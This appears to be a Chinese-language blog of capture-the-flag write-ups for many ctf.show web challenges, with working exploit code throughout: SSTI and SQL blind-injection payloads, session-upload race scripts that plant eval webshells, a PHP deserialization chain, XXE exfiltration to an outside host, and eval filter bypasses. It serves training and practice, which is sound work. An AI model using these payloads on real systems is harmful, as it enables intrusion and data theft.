/usr/local/bin/docker-php-entrypointroot 11 0.0 0.0 23656 592 ? Ss 12:27 0:00 /usr/sbin/cronroot 12 0.0 0.0 4384 4 ? S 12:27 0:00 tail -F /dev/nullroot 13 0.0 0.0 133628 2036 ? Ss 12:27 0:00 php-fpm: master process (/etc/php5/fpm/php-fpm.conf)www-data 14 0.0 0.0 134104 6360 ? S 12:27 0:00 php-fpm: pool wwwwww-data 15 0.0 0.0 134120 5132 ? S 12:27 0:00 php-fpm: pool wwwroot 16 0.0 0.0 85888 1084 ? Ss 12:27 0:00 nginx: master process nginxwww-data 17 0.0 0.0 86524 1852 ? S 12:27 0:00 nginx: worker processwww-data 18 0.0 0.0 86184 1364 ? S 12:27 0:00 nginx: worker processwww-data 19 0.0 0.0 86528 2140 ? S 12:27 0:00 nginx: worker processwww-data 20 0.0 0.0 86184 1328 ? S 12:27 0:00 nginx: worker processwww-data 143 0.0 0.0 133628 7436 ? S 12:40 0:00 php-fpm: pool wwwwww-data 159 0.0 0.0 17952 2856 ? S 12:42 0:00 sh -c /bin/sh -c &quot;cd &quot;/&quot;;ps -aux;echo [S];pwd;echo [E]&quot; 2&gt;&amp;1www-data 160 0.0 0.0 17956 2848 ? S 12:42 0:00 /bin/sh -c cd /;ps -aux;echo [S];pwd;echo [E]www-data 161 0.0 0.0 15568 2116 ? R 12:42 0:00 ps -aux 发现有个敏感文件/usr/local/bin/docker-php-entrypoint 12345678910111213141516#!/bin/shecho $&#123;FLAG&#125; &gt; /flagchown -R root:root /flagchmod 700 /flagunset FLAGphp5-fpm &amp;nginx &amp;/usr/sbin/crontail -F /dev/null 并且nginx的某个进程是以root运行的，搜了下发现CVE-2016-1247 bash反弹shell，将poc传到/tmp目录下 1https:&#x2F;&#x2F;www.seebug.org&#x2F;vuldb&#x2F;ssvid-92538 如果以下报错 1sed -i &quot;s/\\r//&quot; poc 等会就好了 web2蓝瘦内部赛查看源码有两个hint: 12&lt;!-- param: ctfshow --&gt;&lt;!-- key: ican --&gt; 猜测分别是参数，flask key的意思 伪造session 接着就可以传参数ssti,p神的payload直接可以打，flag在环境变量里 1234567891011?ctfshow=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;env&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; web4一览无余_内部赛直接给出源码： 123&lt;?phphighlight_file(__FILE__);?&gt; 这啥也没有啊，看了看网站容器是nginx，猜测是：https://moonback1314.gitee.io/2020/05/05/Vulhub%E4%B9%8Bphp/#CVE-2019-11043 试了试，果然是，不过执行命令时有时候会不成功，flag在网站目录 web5登陆就有flag_内部赛貌似万能密码题，随便加个东西发现提示太长了，应该是长度限制，直接下面都行： 1234u&#x3D;&#39;^&#39;&#39;#&amp;p&#x3D;1u&#x3D;&#39;^0#&amp;p&#x3D;1u&#x3D;&#39;%260#&amp;p&#x3D;1u&#x3D;&#39;%261#&amp;p&#x3D;1 web6签退内部赛源码： 1&lt;?php ($S = $_GET[&#x27;S&#x27;])?eval(&quot;$$S&quot;):highlight_file(__FILE__); payload: 1?S&#x3D;&#123;system(&#39;cat ..&#x2F;..&#x2F;flag.txt&#39;)&#125;; web2_观星过滤了： 1, ascii 空格 &#x3D; like and payload: 1(case/**/when/**/ord(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/in/**/(0x77656231)/**/%26%26/**/table_name/**/in/**/(0x666c6167))/**/from/**/1/**/for/**/1))&lt;100/**/then/**/1/**/else/**/0/**/end)# 有几个点需要注意： and过滤用&amp;&amp;需要url编码 等于号过滤用in,要加括号，还可以用同时不满足大于小于两个条件 单引号过滤用十六进制 ,过滤用from...for exp: 1234567891011121314151617181920212223242526272829303132333435363738import requestsurl=&quot;http://196a9ac5-2082-4530-8ae1-6a72f276e86b.chall.ctf.show/index.php?id=&quot;flag=&#x27;&#x27;for i in range(1,500): f1=flag top=127 low=33 f=1 midflag=1 mid=0 while f and midflag!=mid: f=0 midflag=mid mid=(top+low)//2 p1=&quot;(case/**/when/**/ord(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))&lt;&#123;&#125;/**/then/**/1/**/else/**/0/**/end)#&quot;.format(str(i),str(mid)) p2=&quot;(case/**/when/**/ord(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;/**/then/**/1/**/else/**/0/**/end)#&quot;.format(str(i),str(mid)) try: print(i,mid) r1=requests.get(url+p1) if &#x27;pitch-and-toss,&#x27; in r1.text: top=mid-1 f=1 else: low=mid+1 r2=requests.get(url+p2) if &#x27;pitch-and-toss,&#x27; in r2.text: low=mid+1 f=1 else: top=mid-1 except Exception as e: pass if f==0: flag+=chr(mid) print(flag) if flag==f1: break easyshell_36D练手赛明显hash长度扩展攻击 12345678910111213141516171819import hashpumpyimport urllibimport requestsurl=&#x27;http://7270896d-ae34-4a8f-893e-287f6e5a21cc.chall.ctf.show/?&#x27;hsh=&#x27;fc77c20ed2841d8162335eaebb2f3c09&#x27;s1=&#x27;&#x27;&#x27;1&#x27;&#x27;&#x27;s2=&#x27;&#x27;&#x27;admin&#x27;&#x27;&#x27;for i in range(300): m=hashpumpy.hashpump(hsh,s1,s2,i) #print i name=urllib.quote(urllib.unquote(m[1])) uri=url+&#x27;name=&#x27;+name+&quot;&amp;pass=&quot;+m[0] #print uri r=requests.get(uri) # print r.text if &quot;error&quot; not in r.text: print r.text; break 得到flflflflag.php，访问会跳转，抓包在源码里发现： 1include($_GET[&quot;file&quot;]) 尝试包含session上传进度getshell 123456789101112131415161718192021222324252627282930import requestsimport threadingurl=&#x27;http://7270896d-ae34-4a8f-893e-287f6e5a21cc.chall.ctf.show/flflflflag.php&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=dddd&#x27;&#125;def POST(): while True: files=&#123; &quot;upload&quot;:&#x27;&#x27; #上传无效的空文件 &#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&lt;?php file_put_contents(&quot;/tmp/2&quot;,\\&#x27;&lt;?php @eval($_POST[1]);?&gt;\\&#x27;);echo &quot;moonback&quot;;?&gt;&#x27; &#125; r.post(url,files=files,headers=headers,data=data) # print(&#x27;[+]POST&#x27;)def READ(): while True: t=r.get(url+&quot;?file=/tmp/sess_dddd&quot;) if &#x27;moonback&#x27; in t.text: # print(&#x27;[+]retry&#x27;) print(&#x27;success&#x27;) else: passfor i in range(50): threading.Thread(target=POST,args=()).start() threading.Thread(target=READ,args=()).start() 蚁剑连上bypass disable_function,flag在环境变量里，这题就是NPUCTF原题 贴一下源码： 1234567891011121314151617&lt;?phpinclude &#x27;config.php&#x27;;@$name=$_GET[&#x27;name&#x27;];@$pass=$_GET[&#x27;pass&#x27;];if(md5($secret.$name)===$pass)&#123; echo &#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; window.location.href=&quot;flflflflag.php&quot;; &lt;/script&gt;&#x27;;&#125;else&#123; setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000); echo &quot;username/password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)===$pass --&gt;&lt;/html&gt; CTFshow web1game-gyctf web2扫目录发现www.zip，主要代码都在lib.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;?phperror_reporting(0);session_start();function safe($parm)&#123; $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\\\&#x27;,&quot;*&quot;,&quot;alter&quot;); return str_replace($array,&#x27;hacker&#x27;,$parm);&#125;class User&#123; public $id; public $age=null; public $nickname=null; public function login() &#123; if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123; $mysqli=new dbCtrl(); $this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;); if($this-&gt;id)&#123; $_SESSION[&#x27;id&#x27;]=$this-&gt;id; $_SESSION[&#x27;login&#x27;]=1; echo &quot;你的ID是&quot;.$_SESSION[&#x27;id&#x27;]; echo &quot;你好！&quot;.$_SESSION[&#x27;token&#x27;]; echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;; return $this-&gt;id; &#125; &#125;&#125; public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]); //这个功能还没有写完 先占坑 &#125; public function getNewInfo()&#123; $age=$_POST[&#x27;age&#x27;]; $nickname=$_POST[&#x27;nickname&#x27;]; return safe(serialize(new Info($age,$nickname))); &#125; public function __destruct()&#123; return file_get_contents($this-&gt;nickname);//危 &#125; public function __toString() &#123; $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; &#125;&#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age=$age; $this-&gt;nickname=$nickname; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125; &#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); &#125; public function __destruct() &#123; echo $this-&gt;sql; &#125;&#125;class dbCtrl&#123; public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;noob123&quot;; public $dbpass=&quot;noob123&quot;; public $database=&quot;noob123&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name=$_POST[&#x27;username&#x27;]; $this-&gt;password=$_POST[&#x27;password&#x27;]; $this-&gt;token=$_SESSION[&#x27;token&#x27;]; &#125; public function login($sql) &#123; $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error); &#125; $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token==&#x27;admin&#x27;) &#123; return $idResult; &#125; if (!$idResult) &#123; echo(&#x27;用户不存在!&#x27;); return false; &#125; if (md5($this-&gt;password)!==$passwordResult) &#123; echo(&#x27;密码错误！&#x27;); return false; &#125; $_SESSION[&#x27;token&#x27;]=$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; //还没来得及写 &#125;&#125; 先看下反序列化链： 1UpdateHelper::__destruct() &#x3D;&#x3D;&gt; User::__toString() &#x3D;&#x3D;&gt; Info::__call() &#x3D;&#x3D;&gt; dbCtrl::login() exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpclass User&#123; public $id; public $age; public $nickname; public function __construct()&#123; $this-&gt;nickname = new Info(); $this-&gt;age = &#x27;select password,id from user where username=?&#x27;; &#125; &#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct()&#123; $this-&gt;CtrlCase = new dbCtrl; &#125; &#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct()&#123; $this-&gt;sql = new User(); &#125;&#125;class dbCtrl&#123; public $name=&#x27;admin&#x27;; public $token=&#x27;admin&#x27;;&#125;$a = new UpdateHelper();$x = serialize($a);$cioier = &#x27;&quot;;s:1:&quot;a&quot;;&#x27;.$x.&quot;&#125;&quot;;$len = strlen($cioier);$cioier = str_repeat(&#x27;union&#x27;,$len).$cioier;echo $cioier; 序列化输出： 1O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125; 我们就可以任意sql执行，由于有限制，因此我们可以交换id password的顺序以达到获得password的目的 1select password,id from user where username=? 在update的时候序列化和反序列化的对象： 1234567891011121314&lt;?phpclass Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct()&#123; $this-&gt;age=&#x27;test&#x27;; $this-&gt;nickname=&#x27;test&#x27;; &#125; &#125;$a = new Info();echo serialize($a);// O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:4:&quot;test&quot;;s:8:&quot;nickname&quot;;s:4:&quot;test&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 需要添加的字符串 1&quot;;s:1:&quot;a&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125; 最终payload: 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpclass User&#123; public $id; public $age; public $nickname; public function __construct()&#123; $this-&gt;nickname = new Info(); $this-&gt;age = &#x27;select password,id from user where username=?&#x27;; &#125; &#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct()&#123; $this-&gt;CtrlCase = new dbCtrl; &#125; &#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct()&#123; $this-&gt;sql = new User(); &#125;&#125;class dbCtrl&#123; public $name=&#x27;admin&#x27;; public $token=&#x27;admin&#x27;;&#125;$a = new UpdateHelper();$x = serialize($a);$cioier = &#x27;&quot;;s:1:&quot;a&quot;;&#x27;.$x.&quot;&#125;&quot;;$len = strlen($cioier);$cioier = str_repeat(&#x27;union&#x27;,$len).$cioier;echo $cioier; 登陆得到flag web1观字WEB_AK赛源码： 1234567891011121314&lt;?php#flag in http://192.168.7.68/flagif(isset($_GET[&#x27;url&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; $protocol = substr($url, 0,7); if($protocol!=&#x27;http://&#x27;)&#123; die(&#x27;仅限http协议访问&#x27;); &#125; if(preg_match(&#x27;/\\.|\\;|\\||\\&lt;|\\&gt;|\\*|\\%|\\^|\\(|\\)|\\#|\\@|\\!|\\`|\\~|\\+|\\&#x27;|\\&quot;|\\.|\\,|\\?|\\[|\\]|\\&#123;|\\&#125;|\\!|\\&amp;|\\$|0/&#x27;, $url))&#123; die(&#x27;仅限域名地址访问&#x27;); &#125; system(&#x27;curl &#x27;.$url);&#125; 过滤了一大堆东西，直接中文句号绕过。，payload: 1?url&#x3D;http:&#x2F;&#x2F;192。168。7。68&#x2F;flag web3观图WEB_AK赛查看源码发现： 1showImage.php?image&#x3D;Z6Ilu83MIDw&#x3D; 将image改成image[]=报错： 1Warning: openssl_decrypt() expects parameter 1 to be string, array given in &#x2F;var&#x2F;www&#x2F;html&#x2F;showImage.php on line 8 直接访问showImage.php会有源码： 12345678910111213141516 &lt;?php//$key = substr(md5(&#x27;ctfshow&#x27;.rand()),3,8);//flag in config.phpinclude(&#x27;config.php&#x27;);if(isset($_GET[&#x27;image&#x27;]))&#123; $image=$_GET[&#x27;image&#x27;]; $str = openssl_decrypt($image, &#x27;bf-ecb&#x27;, $key); if(file_exists($str))&#123; header(&#x27;content-type:image/gif&#x27;); echo file_get_contents($str); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 爆破key吧，脚本： 1234567891011121314&lt;?php$image &#x3D; &quot;Z6Ilu83MIDw&#x3D;&quot;;for($i&#x3D;0;$i&lt;100000;$i++)&#123; $key &#x3D; substr(md5(&#39;ctfshow&#39;.$i),3,8); $str &#x3D; openssl_decrypt($image, &#39;bf-ecb&#39;, $key); if(strpos($str,&#39;jpg&#39;)||strpos($str,&#39;png&#39;)||strpos($str,&#39;gif&#39;))&#123; echo &#39;key:&#39;.$key; echo &quot;\\nrand():&quot;.$i; $a &#x3D; openssl_encrypt(&quot;config.php&quot;,&quot;bf-ecb&quot;,$key); echo &quot;\\nanser:&quot;.$a; echo &quot;\\nfile:&quot;.$str; break; &#125;&#125; web4观心WEB_AK赛在js/common.js里看到api.php，占卜抓包发现 貌似是xxe,无回显的，猜测直接用file_get_contents得到xml文件的 服务端的xml: 12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://1.1.1.1/test.dtd&quot;&gt;%remote;%int;%send;]&gt; test.dtd: 12&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;1.1.1.1:9001?p&#x3D;%file;&#39;&gt;&quot;&gt; 签到观己WEB_AK赛源码： 123456789101112131415&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; if(preg_match(&#x27;/php/i&#x27;, $file))&#123; die(&#x27;error&#x27;); &#125;else&#123; include($file); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 直接包含上传进度进度就行： 1234567891011121314151617181920212223242526272829import requestsimport threadingimport sysurl=&#x27;http://87938f25-72e4-4941-a5a5-c9bbdf65dbe6.chall.ctf.show/&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=mb&#x27;&#125;def POST(): files=&#123; &quot;upload&quot;:&#x27;&#x27; #上传无效的空文件 &#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&lt;?php echo &quot;moonback&quot;;file_put_contents(&quot;/tmp/mb&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));?&gt;&#x27; #恶意进度信息，readfile将直接输出文件内容 &#125; r.post(url,files=files,headers=headers,data=data)def READ(): # event.wait() while True: POST() t=r.get(&quot;http://87938f25-72e4-4941-a5a5-c9bbdf65dbe6.chall.ctf.show/?file=/tmp/sess_mb&quot;) if &#x27;moonback&#x27; in t.text: print(&#x27;[+] success&#x27;) breakfor i in range(50): threading.Thread(target=READ,args=()).start() 或者包含日志: 123&#x2F;etc&#x2F;nginx&#x2F;nginx.conf&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log 先包含日志配置文件查看log文件位置，只需在user-agent中加入一句话就行 web入门web11提示域名也可以隐藏信息，立马想到了txt记录，直接nslookup web12提示页面中的信息是密码，发现有个手机号，密码刚好为这 1admin:372619038 web13查看源码发现document.pdf，下载下来找到后台为 12&#x2F;system1103&#x2F;login.php默认账号密码：admin:admin1103 web14查看源码发现/editor/路径，访问查看源码发现是KindEditor，直接在文件空间找到flag的路径为 1&#x2F;nothinghere&#x2F;fl000g.txt web15社工题，首页暴露的邮箱搜了下qq发现居住陕西西安，/admin成功通过密保问题重置密码 web16提示探针，访问tz.php，在phpinfo中找到flag web17网络空间搜索引擎就行，zoomeye直接查 web18查看源代码，发现js中有谐音 1你赢了，去幺幺零点皮爱吃皮看看 访问110.php得到flag web19查看源码发现 12345678910&lt;?phperror_reporting(0);$flag=&quot;fakeflag&quot;;$u = $_POST[&#x27;username&#x27;];$p = $_POST[&#x27;pazzword&#x27;];if(isset($u) &amp;&amp; isset($p))&#123; if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123; echo $flag; &#125;&#125; 并且发现加密方式 123456789101112131415161718192021&lt;script type=&quot;text/javascript&quot;&gt; function checkForm()&#123; var key = &quot;0000000372619038&quot;; var iv = &quot;ilove36dverymuch&quot;; var pazzword = $(&quot;#pazzword&quot;).val(); pazzword = encrypt(pazzword,key,iv); $(&quot;#pazzword&quot;).val(pazzword); $(&quot;#loginForm&quot;).submit(); &#125; function encrypt(data,key,iv) &#123; //key,iv：16位的字符串 var key1 = CryptoJS.enc.Latin1.parse(key); var iv1 = CryptoJS.enc.Latin1.parse(iv); return CryptoJS.AES.encrypt(data, key1,&#123; iv : iv1, mode : CryptoJS.mode.CBC, padding : CryptoJS.pad.ZeroPadding &#125;).toString(); &#125;&lt;/script&gt; aes加密，直接用CyberChef解，后面的点是多余的，即密码为i_want_a_36d_girl web20御剑扫目录发现有/db，手测/db/db.mdb存在，下载下来，16进制编辑器打开，搜索flag web21给的有子典，抓包，发现经过了一层base64加密，没事，burpsuite可以解决 好像不能url编码，最终跑出来 1admin:shark63 web22子域名爆破，盲猜flag.ctfer.com web23源码： 123456789101112131415 &lt;?phperror_reporting(0);include(&#x27;flag.php&#x27;);if(isset($_GET[&#x27;token&#x27;]))&#123; $token = md5($_GET[&#x27;token&#x27;]); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $flag; &#125; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 爆破，可以知道，第2位，第15位，第18位是一样的，并且为数字，第32位为3，exp: 1234567import hashlibfor i in range(1, 1000000000000000): s = hashlib.md5(str(i).encode()).hexdigest() if s[1]==s[14] and s[14]==s[17] and s[31].isdigit() and s[31]==&#x27;3&#x27;: print(i,s) break web24源码： 12345678910111213&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(372619038); if(intval($r)===intval(mt_rand()))&#123; echo $flag; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;);&#125; 伪随机数，版本是php7 1234&lt;?phpmt_srand(372619038);echo mt_rand();// 1155388967 web25源码： 123456789101112131415161718&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(hexdec(substr(md5($flag), 0,8))); $rand = intval($r)-intval(mt_rand()); if((!$rand))&#123; if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123; echo $flag; &#125; &#125;else&#123; echo $rand; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;);&#125; 直接php_mt_seed爆破种子，直接爆破的话需要36*36*36次，上万了，不太现实，注意mt_rand()的次数 1234&lt;?phpmt_srand(117235642);mt_rand();echo (mt_rand()+mt_rand()); web26就爆破完事了，密码：7758521 web27录取名单下载下来list.xlsx，里面有学生的信息，搜了下名字，找到：https://tools.aizhan.com/rb/idcard.ifanyi.com.cn 其实爆破也行，缺失的部分是人的生日 12345678910&lt;html&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://3a5c5c7a-84c9-485d-8a71-822803a153ff.chall.ctf.show/info/checkdb.php&quot;&gt; &lt;input id=&quot;a&quot; name=&quot;a&quot; type=&quot;text&quot; placeholder=&quot;姓名&quot;&gt; &lt;input id=&quot;p&quot; name=&quot;p&quot; type=&quot;text&quot; placeholder=&quot;身份证号码&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 登陆成功给了学号和默认密码，登陆就有flag web28直接上图 在中间 没仔细看 透 web291234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;system(&#39;cat *&#39;); web301234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;$a&#x3D;&#39;sys&#39;.&#39;tem&#39;;$a(&#39;cat *&#39;); web311234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;$a&#x3D;str_replace(&quot;a&quot;,&quot;&quot;,&quot;sysatem&quot;);$a(&quot;head%09-n%09100%09*&quot;); web321234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;include&quot;$_GET[1]&quot;?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php web331234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;include&#x2F;**&#x2F;$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php web341234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;include&#x2F;**&#x2F;$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php web351234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;include&#x2F;**&#x2F;$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php web361234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=|\\/|[0-9]/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php web3712345678910111213&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; payload: 12?c&#x3D;php:&#x2F;&#x2F;inputPOST: &lt;?php system(&#39;cat *&#39;); session上传进度getshell,exp： 12345678910111213141516171819202122232425262728import requestsimport threadingurl=&#x27;http://b440e730-82ed-40ce-a359-947492fc8c6d.chall.ctf.show/&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=moonback&#x27;&#125;def POST(): files=&#123; &quot;upload&quot;:&#x27;&#x27; #上传无效的空文件 